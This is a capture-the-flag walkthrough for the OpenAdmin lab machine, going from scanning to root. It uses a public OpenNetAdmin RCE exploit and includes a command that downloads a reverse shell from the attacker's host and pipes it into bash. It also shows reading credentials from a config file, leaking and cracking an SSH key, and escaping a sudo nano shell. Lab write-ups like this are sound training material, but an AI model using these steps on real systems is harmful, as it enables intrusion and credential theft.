## OpenAdmin

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.171 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/ac914b6f-b28c-477b-a074-4f61b2d1e769)

<br>

GoBuster finds 3 directories.

![gobuster](https://github.com/b1d0ws/OSCP/assets/58514930/c22678dd-0712-4fe9-844e-ddcb6a07337d)

<br>

If you click on Login button inside /music you find /ona.

![loginButton](https://github.com/b1d0ws/OSCP/assets/58514930/1774186c-19e9-4964-850f-a448ed0f5e2d)

![onav18](https://github.com/b1d0ws/OSCP/assets/58514930/b7a769e5-2f02-4d75-a4de-2f730c209641)

<br>

Ona is related to OpenNetAdmin. Searching for ONA 18.1.1, we find a public [RCE exploit](https://www.exploit-db.com/exploits/47691).

![findingRCE](https://github.com/b1d0ws/OSCP/assets/58514930/196231db-18db-47f1-9ba1-abb4831f10fd)

<br> 

Use it to get a basic reverse shell, and get a better one using the curl command.

```
./47691.sh http://openadmin.htb/ona/
curl http://10.10.14.11:8000/reverse | bash
```

![gettingReverseShell](https://github.com/b1d0ws/OSCP/assets/58514930/a3a0e0a4-84a7-4491-b8d3-9704344750bf)

<br>

Inside the machine, we can find the [OpenNetAdmin DB Password](https://opennetadmin.com/forum_archive/4/t-85.html) reading the file /opt/ona/www/local/config/database_settings.inc.php.  

You can login via SSH as Jimmy user with this password.

![gettingJimmyPass](https://github.com/b1d0ws/OSCP/assets/58514930/dc439698-ea96-49a5-9c8a-96b3fd2f5179)

To escalate to joanna, you need to read her SSH Key. There are two ways to do this.

First you enumerate that there is another website inside /var/www/internal. Inside this directory, there is this main.php file that read her SSH Key. The easy way is just call this guy with curl.

You just need to find which port is running the site. You can enumerate via network commands or reading /etc/apache2/sites-available/internal.conf.

```
curl 127.0.0.1:52846/main.php
```

![mainPHP](https://github.com/b1d0ws/OSCP/assets/58514930/06660d07-5274-4f8a-a5b9-30f667f25ba4)

![readingKeyViaCurl](https://github.com/b1d0ws/OSCP/assets/58514930/63ce33c2-5e22-4114-8504-b15e2d193d47)

<br>

The other way is redirecting the port. But this time you need to go through a login form.

```
ssh -L 8000:127.0.0.1:52846 jimmy@10.10.10.171
```

![portForwarding](https://github.com/b1d0ws/OSCP/assets/58514930/d9e6f3f1-8515-4f38-a982-dd2d93fdc0a3)

![loginPortForward](https://github.com/b1d0ws/OSCP/assets/58514930/9cc3522b-4625-48b7-b8d1-894105926e35)

<br>

The password is hashed with SHA512. This hash is crackable in crackstation. Find the "Revealed" password and get the SSH Key.

![otherJimmyPassword](https://github.com/b1d0ws/OSCP/assets/58514930/7601d80c-033c-440d-8881-97f784c39b6c)

![crackingPass](https://github.com/b1d0ws/OSCP/assets/58514930/2a586121-1140-4b6a-8640-5afe181e6267)

![readingKeyViaHTTP](https://github.com/b1d0ws/OSCP/assets/58514930/527d8e67-00e6-4259-be13-2d2a6283e30d)

<br>

Now we need to crack the rsa password with john to login as joanna.

```
ssh2john id_rsa > rsaHash
john rsaHash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Root Flag

Enumerating with sudo -l, we find:

![sudo -l](https://github.com/b1d0ws/OSCP/assets/58514930/dc385e4e-840c-4787-a7ba-99f496586e92)

<br>

Follow [this way](https://gtfobins.github.io/gtfobins/nano/#shell) to evoke a shell inside nano:

```bash
sudo /bin/nano /opt/priv
CTRL R + CTRL X
reset; bash 1>&0 2>&0 + ENTER
```

![nanoShell](https://github.com/b1d0ws/OSCP/assets/58514930/ac77fe7f-fe0d-4c53-8192-a58a0b62c83a)
